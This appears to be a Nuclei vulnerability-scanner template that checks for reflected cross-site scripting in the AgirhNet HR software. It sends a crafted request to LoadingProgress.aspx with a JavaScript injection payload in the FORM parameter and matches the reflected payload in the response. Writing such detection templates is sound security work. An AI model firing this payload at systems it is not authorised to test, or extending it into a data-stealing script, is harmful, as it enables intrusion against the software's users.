id: agirhnet-xss

info:
  name: Agirhnet-XSS
  author: nithissh
  severity: medium
  description: AGIRH is a fully integrated software package for human capital management which is vulnerable to Reflected XSS
  reference: https://packetstormsecurity.com/files/166096/Agirhnet-1.0-Cross-Site-Scripting.html
  tags: xss

requests:
- raw:
  - |+
    GET /AgirhNet/LoadingProgress.aspx?FORM=/%22%0Aconfirm(document.domain)//  HTTP/1.1
    Host: {{Hostname}}


  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - confirm(document.domain)//
  - type: status
    status:
    - 200
